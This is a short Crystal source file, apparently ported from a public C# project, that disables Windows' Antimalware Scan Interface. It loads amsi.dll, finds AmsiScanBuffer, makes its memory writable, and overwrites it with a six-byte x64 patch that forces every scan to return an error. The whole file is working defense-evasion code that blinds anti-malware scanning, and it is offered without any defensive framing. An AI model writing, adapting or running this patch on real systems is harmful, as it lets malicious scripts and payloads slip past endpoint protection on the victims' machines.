# Reference
# - https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
# - "Crystal Programming" Discord
# - https://crystal-lang.org/reference/1.7/syntax_and_semantics/c_bindings/index.html

# VirtualProtect() is not defined in the C binding of Crystal (yet?)
lib LibC
  alias PDWORD = Pointer(UInt32)
  fun VirtualProtect(lpAddress : Void*, dwSize : SizeT, flNewProtect : DWORD, lpflOldProtect : PDWORD) : BOOL
end

dll_name = "amsi.dll"

# Reference to convert dll_name to a WSTR: https://github.com/crystal-lang/crystal/blob/f0bd16a8dcc43f02ba118d7f0b912eab3251b927/src/crystal/system/windows.cr
amsi_ptr = LibC.LoadLibraryExW(dll_name.to_utf16.to_unsafe, nil, 0)
function_amsi_ptr = LibC.GetProcAddress(amsi_ptr, "AmsiScanBuffer")

# x64 patch
patch = Bytes[ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 ]

# RX -> RWX
old_protect = LibC::PDWORD.malloc(4)
LibC.VirtualProtect(function_amsi_ptr, patch.size, 0x40, old_protect)

# Patching
Intrinsics.memcpy(function_amsi_ptr, patch, patch.size, false)

# RWX -> RX
LibC.VirtualProtect(function_amsi_ptr, patch.size, old_protect.value, old_protect)
